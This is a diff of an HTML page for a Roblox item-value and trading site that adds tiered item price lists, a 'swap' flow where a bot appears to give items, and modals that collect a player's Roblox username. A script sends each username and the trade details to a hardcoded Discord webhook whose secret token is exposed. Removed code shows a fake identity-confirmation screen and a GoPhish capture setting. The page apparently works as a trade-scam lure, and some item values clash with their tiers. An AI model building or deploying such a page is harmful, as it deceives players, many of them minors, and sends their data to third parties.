+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/PumpkingUP.png" alt="Pumpking"><div class="item-name">Pumpking</div><div class="item-value">💎 310</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CookiebladeUP.png" alt="Cookieblade"><div class="item-name">Cookieblade</div><div class="item-value">💎 305</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SnowflakeUP.png" alt="Snowflake"><div class="item-name">Snowflake</div><div class="item-value">💎 300</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/NightBladeUp.png" alt="Night Blade"><div class="item-name">Night Blade</div><div class="item-value">💎 298</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/eternal3.png" alt="Eternal III"><div class="item-name">Eternal III</div><div class="item-value">💎 295</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Snowcannon.png" alt="Snowcannon"><div class="item-name">Snowcannon</div><div class="item-value">💎 1550</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/FrostsaberUP.png" alt="Frostsaber"><div class="item-name">Frostsaber</div><div class="item-value">💎 288</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Mm2bioblade.png" alt="Bioblade"><div class="item-name">Bioblade</div><div class="item-value">💎 284</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/AmeriUP.png" alt="Amerilaser"><div class="item-name">Amerilaser</div><div class="item-value">💎 280</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceBeamUP.png" alt="Icebeam"><div class="item-name">Icebeam</div><div class="item-value">💎 278</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/PrismaticUp.png" alt="Prismatic"><div class="item-name">Prismatic</div><div class="item-value">💎 276</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Eternal_2UP.png" alt="Eternal II"><div class="item-name">Eternal II</div><div class="item-value">💎 272</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Ornament.png" alt="Ornament"><div class="item-name">Ornament</div><div class="item-value">💎 270</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Snowcannon.png" alt="Snowcannon"><div class="item-name">Snowcannon</div><div class="item-value">💎 268</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/EternalUpdated.png" alt="Eternal"><div class="item-name">Eternal</div><div class="item-value">💎 262</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ornagodly.png" alt="Ornament"><div class="item-name">Ornament</div><div class="item-value">💎 260</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/XmasUP.png" alt="Xmas"><div class="item-name">Xmas</div><div class="item-value">💎 258</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/EggbladeUP.png" alt="Eggblade"><div class="item-name">Eggblade</div><div class="item-value">💎 258</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Green_Luger.png" alt="Green Luger"><div class="item-name">Green Luger</div><div class="item-value">💎 255</div></div>
   </div>
-</div>
 
-<!-- Join bot -->
-<div class="overlay" id="ovJoinBot">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovJoinBot')">✕</button>
-    <img class="botimg" src="https://jacevalues.com/images/jacebot.png" alt="">
-    <h3>You must join our bot to get in the server!</h3>
-    <p>You can only join our bot from here.</p>
-    <div style="display:flex; align-items:center; justify-content:center; gap:10px;">
-      <img src="https://jacevalues.com/images/headshot.png" style="width:36px; height:36px; border-radius:50%;" alt="">
-      <button class="btn-primary" onclick="closeOverlay('ovJoinBot'); openOverlay('ovConfirm');">Join</button>
+  <div class="section-title">Tier 3 <span class="count">48</span></div>
+  <div class="grid">
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaAlienbeam.png" alt="Alienbeam"><div class="item-name">Alienbeam</div><div class="item-value">💎 248</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/WinterEdgeUP.png" alt="Winter's Edge"><div class="item-name">Winter's Edge</div><div class="item-value">💎 248</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/GingerbladeUP.png" alt="Gingerblade"><div class="item-name">Gingerblade</div><div class="item-value">💎 240</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromavampsgun.png" alt="Vampire's Gun"><div class="item-name">Vampire's Gun</div><div class="item-value">💎 235</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/LugerCaneUP.png" alt="Luger Cane"><div class="item-name">Luger Cane</div><div class="item-value">💎 230</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ghostblade.png" alt="Ghostblade"><div class="item-name">Ghostblade</div><div class="item-value">💎 222</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Seer.png" alt="Seer"><div class="item-name">Seer</div><div class="item-value">💎 211</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Bloom_Knife.png" alt="Bloom"><div class="item-name">Bloom</div><div class="item-value">💎 205</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Evergun.png" alt="Evergun"><div class="item-name">Evergun</div><div class="item-value">💎 200</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Gingerscope.png" alt="Gingerscope"><div class="item-name">Gingerscope</div><div class="item-value">💎 7850</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Pearlshine.png" alt="Pearlshine"><div class="item-name">Pearlshine</div><div class="item-value">💎 195</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Pearl.png" alt="Pearl"><div class="item-name">Pearl</div><div class="item-value">💎 185</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/blueseer.png" alt="Blue Seer"><div class="item-name">Blue Seer</div><div class="item-value">💎 182</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Updated_Candy.png" alt="Candy"><div class="item-name">Candy</div><div class="item-value">💎 180</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaRaygun.png"><div class="item-name">Raygun</div><div class="item-value">💎 650</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/peppermint.png" alt="Peppermint"><div class="item-name">Peppermint</div><div class="item-value">💎 178</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Waves_knife.png" alt="Waves"><div class="item-name">Waves</div><div class="item-value">💎 175</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Darkbringer.png" alt="Darkbringer"><div class="item-name">Darkbringer</div><div class="item-value">💎 175</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CHeartwand.png" alt="Heart Wand"><div class="item-name">Heart Wand</div><div class="item-value">💎 172</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Ocean_gun.png" alt="Ocean"><div class="item-name">Ocean</div><div class="item-value">💎 170</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Evergreen.png" alt="Evergreen"><div class="item-name">Evergreen</div><div class="item-value">💎 1950</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/DarkbringerUpdated.png" alt="Darkbringer"><div class="item-name">Darkbringer</div><div class="item-value">💎 165</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Flowerwood_Knife.png" alt="Flowerwood Knife"><div class="item-name">Flowerwood Knife</div><div class="item-value">💎 165</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaluger.png" alt="Luger"><div class="item-name">Luger</div><div class="item-value">💎 165</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CSands%20(1).png" alt="Sands"><div class="item-name">Sands</div><div class="item-value">💎 750</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Heartwand.png" alt="Heart Wand"><div class="item-name">Heart Wand</div><div class="item-value">💎 350</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CorruptUp.png" alt="Corrupt"><div class="item-name">Corrupt</div><div class="item-value">💎 530</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/vampsgun.png" alt="Vampire's Gun"><div class="item-name">Vampire's Gun</div><div class="item-value">💎 1550</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SandsGodly2026%20(1).png" alt="Sands"><div class="item-name">Sands</div><div class="item-value">💎 155</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/vampsaxe.png" alt="Vampire's Axe"><div class="item-name">Vampire's Axe</div><div class="item-value">💎 1555</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/orangeseer.png" alt="Orange Seer"><div class="item-name">Orange Seer</div><div class="item-value">💎 155</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Darkshot.png" alt="Darkshot"><div class="item-name">Darkshot</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Darksword.png" alt="Darksword"><div class="item-name">Darksword</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Flora_Gun.png" alt="Flora"><div class="item-name">Flora</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/CBeachy%20(1).png" alt="Beachy"><div class="item-name">Beachy</div><div class="item-value">💎 148</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/2024Australis.png" alt="Australis"><div class="item-name">Australis</div><div class="item-value">💎 145</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BeachyGodly2026%20(1).png" alt="Beachy"><div class="item-name">Beachy</div><div class="item-value">💎 140</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/2024Borealis.png" alt="Borealis"><div class="item-name">Borealis</div><div class="item-value">💎 130</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaConstellation.png" alt="Constellation"><div class="item-name">Constellation</div><div class="item-value">💎 2990</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Sugar_v2.png" alt="Sugar"><div class="item-name">Sugar</div><div class="item-value">💎 125</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaBlizzard.png" alt="Blizzard"><div class="item-name">Blizzard</div><div class="item-value">💎 120</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/C_Icecream%20(2).png" alt="Icecream"><div class="item-name">Icecream</div><div class="item-value">💎 120</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Csweet.png" alt="Sweet"><div class="item-name">Sweet</div><div class="item-value">💎 118</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Watergun.png" alt="Watergun"><div class="item-name">Watergun</div><div class="item-value">💎 115</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Icecream_knife%20(1).png" alt="Icecream"><div class="item-name">Icecream</div><div class="item-value">💎 115</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Ctreat.png" alt="Treat"><div class="item-name">Treat</div><div class="item-value">💎 2020</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Sweet.png" alt="Sweet"><div class="item-name">Sweet</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Turkey.png"><div class="item-name">Turkey</div><div class="item-value">💎 2110</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Treat.png" alt="Treat"><div class="item-name">Treat</div><div class="item-value">💎 155</div></div>
+  </div>
+
+  <div class="section-title">Tier 2 <span class="count">37</span></div>
+  <div class="grid">
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HallowEdgeUp.png" alt="Hallow's Edge"><div class="item-name">Hallow's Edge</div><div class="item-value">💎 100</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Snowstorm.png" alt="Snowstorm"><div class="item-name">Snowstorm</div><div class="item-value">💎 100</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ChromaElderwoodBlade.png" alt="Elderwood Blade"><div class="item-name">Elderwood Blade</div><div class="item-value">💎 99</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ewscythe.png" alt="Elderwood Scythe"><div class="item-name">Elderwood Scythe</div><div class="item-value">💎 97</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HallowscytheUp.png" alt="Hallow's Scythe"><div class="item-name">Hallow's Scythe</div><div class="item-value">💎 96</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Flowerwood_Gun.png" alt="Flowerwood Gun"><div class="item-name">Flowerwood Gun</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ElderwoodBlade.png" alt="Elderwood Blade"><div class="item-name">Elderwood Blade</div><div class="item-value">💎 95</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Snowstorm.png" alt="Snowstorm"><div class="item-name">Snowstorm</div><div class="item-value">💎 120</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceDragonUp.png" alt="Ice Dragon"><div class="item-name">Ice Dragon</div><div class="item-value">💎 92</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Blizzard%20(2).png" alt="Blizzard"><div class="item-name">Blizzard</div><div class="item-value">💎 120</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/HallowsbladeUP.png" alt="Hallow's Blade"><div class="item-name">Hallow's Blade</div><div class="item-value">💎 90</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/SunsetKnife.png" alt="Sunset"><div class="item-name">Sunset</div><div class="item-value">💎 1210</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/FrostbiteUP.png" alt="Frostbite"><div class="item-name">Frostbite</div><div class="item-value">💎 88</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/WaterGun.png" alt="Watergun"><div class="item-name">Watergun</div><div class="item-value">💎 150</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/hallowgunup.png" alt="Hallowgun"><div class="item-name">Hallowgun</div><div class="item-value">💎 85</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/FlamesUp.png" alt="Flames"><div class="item-name">Flames</div><div class="item-value">💎 85</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Rainbowblade.png" alt="Rainbow"><div class="item-name">Rainbow</div><div class="item-value">💎 220</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Alienbeam.png" alt="Alienbeam"><div class="item-name">Alienbeam</div><div class="item-value">💎 780</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/rainbowgun.png" alt="Rainbow Gun"><div class="item-name">Rainbow Gun</div><div class="item-value">💎 220</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Xenoshot.png" alt="Xenoshot"><div class="item-name">Xenoshot</div><div class="item-value">💎 760</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Xenoknife.png" alt="Xenoknife"><div class="item-name">Xenoknife</div><div class="item-value">💎 740</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/2024Constellation.png" alt="Constellation"><div class="item-name">Constellation</div><div class="item-value">💎 1330</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Red_Luger.png" alt="Red Luger"><div class="item-name">Red Luger</div><div class="item-value">💎 70</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Evergun.png" alt="Evergun"><div class="item-name">Evergun</div><div class="item-value">💎 1550</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Raygun.png" alt="Raygun"><div class="item-name">Raygun</div><div class="item-value">💎 1550</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/TravGun.png" alt="Traveler's Gun"><div class="item-name">Traveler's Gun</div><div class="item-value">💎 4220</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Snow_Dagger.png" alt="Snow Dagger"><div class="item-name">Snow Dagger</div><div class="item-value">💎 62</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IceblasterUP.png" alt="Iceblaster"><div class="item-name">Iceblaster</div><div class="item-value">💎 61</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/spirit.png" alt="Spirit"><div class="item-name">Spirit</div><div class="item-value">💎 60</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/ewrev.png" alt="Elderwood Revolver"><div class="item-name">Elderwood Revolver</div><div class="item-value">💎 60</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Chroma_Boneblade.png"><div class="item-name">Boneblade</div><div class="item-value">💎 60</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/TravellersAxe.png" alt="Traveler's Axe"><div class="item-name">Traveler's Axe</div><div class="item-value">💎 3110</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Bat_Zombie.png" alt="Bat"><div class="item-name">Bat</div><div class="item-value">💎 56</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/soul.png" alt="Soul"><div class="item-name">Soul</div><div class="item-value">💎 55</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Snow_Dagger.png" alt="Snow Dagger"><div class="item-name">Snow Dagger</div><div class="item-value">💎 55</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/chromaseer.png" alt="Seer"><div class="item-name">Seer</div><div class="item-value">💎 55</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Makeshift.png">Makeshift</div><div class="item-value">💎 51</div></div>
+  </div>
+
+  <div class="section-title">Tier 1 <span class="count">4</span></div>
+  <div class="grid">
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/Icebreaker.png" alt="Icebreaker"><div class="item-name">Icebreaker</div><div class="item-value">💎 48</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/IcewingknifeUp.png" alt="Icewing"><div class="item-name">Icewing</div><div class="item-value">💎 42</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/BonebladeUP.png" alt="Boneblade"><div class="item-name">Boneblade</div><div class="item-value">💎 33</div></div>
+    <div class="card"><img class="item-img" src="https://jacevalues.com/godlies/yellowseer.png" alt="Yellow Seer"><div class="item-name">Yellow Seer</div><div class="item-value">💎 14</div></div>
+  </div>
+  </div>
+</section>
+
+<section id="swap" class="page-section">
+  <div class="hero"><h1>NOVA SWAP</h1><p>Select items from the value list and build both sides of the trade.</p></div>
+  <div class="swap-warning" id="swapWarning" style="display:none">
+    <span class="swap-warning-icon">⚡</span>
+    <span id="swapWarningText"></span>
+  </div>
+  <div class="swap-grid">
+    <div class="trade-box selected" id="giveBox" data-side="give">
+      <span class="trade-title">YOU GIVE</span>
+      <span class="trade-value" id="giveTotal">💎 0</span>
+      <div class="slots" id="giveSlots">
+        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
+        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
+      </div>
+    </div>
+    <div class="swap-middle">
+      <div class="swap-icon">⇄</div>
+      <button class="swap-btn" id="swapAction">SWAP</button>
+      <div class="hint">Choose a side, then click an item below</div>
+    </div>
+    <div class="trade-box" id="botBox" data-side="bot">
+      <span class="trade-title">BOT GIVE</span>
+      <span class="trade-value" id="botTotal">💎 0</span>
+      <div class="slots" id="botSlots">
+        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
+        <div class="slot add-slot">＋</div><div class="slot add-slot">＋</div>
+      </div>
+    </div>
+  </div>
+
+</section>
+
+<section id="history" class="page-section">
+  <div class="hero"><h1>TRADE HISTORY</h1><p>Past swap tickets recorded on this device.</p></div>
+  <div class="history-wrap" id="historyWrap"></div>
+</section>
+
+
+<div class="modal-backdrop" id="godlyModal" aria-hidden="true">
+  <div class="godly-modal" role="dialog" aria-modal="true" aria-labelledby="godlyTitle">
+    <div class="picker-head">
+      <strong id="godlyTitle">CHOOSE AN ITEM</strong>
+      <span>Click an item to add it to this slot</span>
+    </div>
+    <input id="godlySearch" class="godly-search" placeholder="Search values...">
+    <div id="godlyScroll"></div>
+    <button class="cancel-btn" id="closeGodly">CANCEL</button>
+    <div class="godly-scroll-btns">
+      <button type="button" class="godly-scroll-btn" id="godlyScrollUp" title="Scroll up" aria-label="Scroll up">▲</button>
+      <button type="button" class="godly-scroll-btn" id="godlyScrollDown" title="Scroll down" aria-label="Scroll down">▼</button>
     </div>
   </div>
 </div>
 
-<!-- Confirm your Roblox account -->
-<div class="overlay" id="ovConfirm">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovConfirm')">✕</button>
-    <h3>Confirm your Roblox account</h3>
-    <p>Type your Roblox username so the bot can find you and complete the swap.</p>
-    <div class="err" id="confirmErr">Username not found. Check spelling and try again.</div>
-    <input class="rolox" type="text" id="roloxInput" placeholder="Roblox username" autocomplete="off">
-    <button class="btn-primary" id="searchBtn" onclick="searchRoblox()">SEARCH</button>
+<!-- SWAP FEEDBACK FLOW: reference ticket -> username record -> star
+     rating. No fake "is this you" identity screen — the username
+     the person types is never echoed back with a photo or matched
+     against anything, it's just recorded alongside the ticket.
+     PLACEHOLDER_IMG below = swap in your own art/logo later. -->
+<div class="modal-backdrop" id="ticketModal" aria-hidden="true">
+  <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="ticketTitle">
+    <!-- THIS WHERE U CHANGE REFERENCE IMAGE (src below) -->
+    <img class="modal-placeholder-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGMfqbI4vWh3OgIovspkJYWDeYHpVKEb7IJkImo7jTaA&s=10" alt="Trade image">
+    <h2 id="ticketTitle">SWAP REFERENCE</h2>
+    <p>Save this reference number — use it if you ever need to report a problem with this trade.</p>
+    <div id="ticketNumberDisplay" style="font-family:'Barlow Condensed',sans-serif;font-size:30px;letter-spacing:2px;color:var(--cyan);margin:4px 0 20px"></div>
+    <button class="roblox-link" id="ticketNext" style="border:0;cursor:pointer;width:100%;font:inherit">NEXT</button>
+    <button class="cancel-btn" id="closeTicket">CANCEL</button>
   </div>
 </div>
 
-<!-- Looking up account -->
-<div class="overlay" id="ovLooking">
-  <div class="modal">
-    <div class="spinner"></div>
-    <p class="searching">Looking up your account...</p>
+<div class="modal-backdrop" id="usernameModal" aria-hidden="true">
+  <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="usernameTitle">
+    <!-- THIS WHERE U CHANGE ROBLOX USERNAME IMAGE (src below) -->
+    <img class="modal-placeholder-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRGMfqbI4vWh3OgIovspkJYWDeYHpVKEb7IJkImo7jTaA&s=10" alt="Trade image">
+    <h2 id="usernameTitle">YOUR ROBLOX USERNAME</h2>
+    <p>Enter your Roblox username so it's attached to this trade's reference number, then continue to Roblox to finish the swap.</p>
+    <input id="rbxUsernameInput" placeholder="Roblox username" style="width:100%;padding:12px 14px;border-radius:10px;border:1px solid #263653;background:#0b1426;color:#fff;font-size:14px;margin-bottom:14px;outline:none;box-sizing:border-box">
+    <button class="roblox-link" id="usernameContinue" style="border:0;cursor:pointer;width:100%;font:inherit">NEXT</button>
+    <button class="cancel-btn" id="closeUsername">CANCEL</button>
   </div>
 </div>
 
-<!-- Is this you? -->
-<div class="overlay" id="ovIsYou">
-  <div class="modal confirm-user">
-    <button class="close" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">✕</button>
-    <h3>Is this you?</h3>
-    <img id="userHeadshot" src="" alt="">
-    <div class="uname" id="userName"></div>
-    <div class="udisp" id="userDisp"></div>
-    <div class="btn-row">
-      <button class="btn-primary" id="yesBtn">YES, THAT'S ME</button>
-      <button class="btn-ghost" onclick="closeOverlay('ovIsYou'); openOverlay('ovConfirm');">NO, RETRY</button>
-    </div>
+<div class="modal-backdrop" id="robloxTransitionModal" aria-hidden="true">
+  <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="robloxTransitionTitle" style="max-height:90vh;overflow-y:auto;">
+    <img class="modal-placeholder-img" src="https://jacevalues.com/images/kick.png" alt="Trade image">
+    <div id="robloxTransitionTicketRef" class="modal-ticket-ref"></div>
+    <h2 id="robloxTransitionTitle" style="color:#ff0000!important;">HEADING TO ROBLOX</h2>
+    <p>This trade's reference number is saved. You'll finish the actual swap on Roblox's own site.</p>
+    <div id="robloxTransitionSummary" class="modal-trade-summary"></div>
+    <!-- REDIRECT #2 (CONTINUE TO ROBLOX): sends the person to the
+         real Roblox site once ticket + username are recorded. -->
+    <button class="roblox-link" id="robloxTransitionContinue" style="border:0;cursor:pointer;width:100%;font:inherit">CONTINUE TO ROBLOX</button>
+    <button class="cancel-btn" id="closeRobloxTransition">CANCEL</button>
+  </div>
+</div>
+  
+<div class="modal-backdrop" id="ratingModal" aria-hidden="true">
+  <div class="login-modal" role="dialog" aria-modal="true" aria-labelledby="ratingTitle">
+    <div class="modal-icon">★</div>
+    <h2 id="ratingTitle">RATE THIS TRADE</h2>
+    <p>How did the swap go? This is saved with your reference number so you can build feedback history from it.</p>
+    <div id="starPicker" style="font-size:34px;letter-spacing:10px;margin:8px 0 20px;cursor:pointer"></div>
+    <button class="roblox-link" id="submitRating" style="border:0;cursor:pointer;width:100%;font:inherit">SUBMIT FEEDBACK</button>
+    <button class="cancel-btn" id="closeRating">SKIP</button>
   </div>
 </div>
 
-<!-- Swap it (final) -->
-<div class="overlay" id="ovSwapIt">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovSwapIt')">✕</button>
-    <img class="check" src="https://jacevalues.com/images/checkmark_white.png" alt="">
-    <h3>SWAP IT</h3>
-    <p id="swapSummary"></p>
-    <button class="btn-primary" onclick="closeOverlay('ovSwapIt'); openOverlay('ovRate');">CONTINUE</button>
-  </div>
-</div>
-
-<!-- Rate -->
-<div class="overlay" id="ovRate">
-  <div class="modal">
-    <button class="close" onclick="closeOverlay('ovRate')">✕</button>
-    <h3>Give us a rate!</h3>
-    <p>Did you enjoy our servers?</p>
-    <div style="color:#a78bfa; font-size:22px; margin-bottom:14px;">★★★★★</div>
-    <button class="btn-primary" onclick="closeOverlay('ovRate');">Rate</button>
-  </div>
-</div>
-
-<footer>
-  © 2026 Jace Values. All rights reserved. · Powered by Jace™ · v35
-</footer>
+</main>
+<footer>© 2026 Nova Values. All rights reserved. · Powered by Nova™</footer>
 
 <script>
-/* =========================================================
-   Simulation mode flag — keep FALSE for demo purposes.
-   When TRUE, submits the confirmed username to your own
-   GoPhish capture endpoint (configurable below) instead of
-   just displaying it. Never point this at anything you
-   don't own or have explicit written authorization to test.
-   ========================================================= */
-const SIMULATION_MODE = false;
-const GOPHISH_CAPTURE_URL = "https://your-gophish-server/capture";
+// ============================================================
+// DISCORD WEBHOOK — posts a message into your server's channel
+// whenever a trade ticket is created (see submitRating handler
+// near the bottom, which fires this after the rating step).
+// Replace the URL below if you ever regenerate the webhook.
+// ============================================================
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1543903849952186380/Y80lraAhKp3-4rZh6SLaW9-xxXqel04XK_8krTFBqRiE65DigFOsKdT-xIrgzYTEuIfT';
 
-/* ---------- Overlay helpers ---------- */
-function openOverlay(id)   { document.getElementById(id).classList.add('show'); }
-function closeOverlay(id)  { document.getElementById(id).classList.remove('show'); }
-
-/* ---------- Random bot room code ---------- */
-function randomRoomCode() {
-  const chars = "ABCDEFGHJKMNPQRSTUVWXYZ0123456789";
-  let code = "#";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  code += "-";
-  for (let i = 0; i < 3; i++) code += chars[Math.floor(Math.random() * chars.length)];
-  return code;
+function sendTicketToDiscord(entry){
+  if(!DISCORD_WEBHOOK_URL) return;
+  const itemsLine = entry.items && entry.items.length
+    ? entry.items.map(i=>`${i.side==='give'?'You gave':'Bot gave'}: ${i.name} (💎${i.value})`).join('\n')
+    : 'No items recorded';
+  const stars = '★'.repeat(entry.rating) + '☆'.repeat(5-entry.rating);
+  const payload = {
+    embeds: [{
+      title: `New Trade Ticket ${entry.ticket}`,
+      color: 0x2dd4bf,
+      fields: [
+        { name: 'Roblox Username', value: entry.username || 'Unknown', inline: true },
+        { name: 'Rating', value: stars, inline: true },
+        { name: 'Items', value: itemsLine }
+      ],
+      timestamp: entry.date
+    }]
+  };
+  fetch(DISCORD_WEBHOOK_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(payload)
+  }).catch(err => console.error('Discord webhook failed', err));
 }
 
-/* ---------- Flow: Join server ---------- */
-function openServerFlow() {
-  openOverlay('ovSearching');
-  document.getElementById('searchLabel').textContent = "Searching server...";
-  document.getElementById('roomCode').textContent = randomRoomCode();
-  setTimeout(() => {
-    closeOverlay('ovSearching');
-    openOverlay('ovServerFound');
-  }, 2200);
+// ============================================================
+// REDIRECT #1 — SERVERS PAGE
+// Every "Join" button under Asia / Europe / North America / South
+// America opens the real Roblox site in a new tab.
+// ============================================================
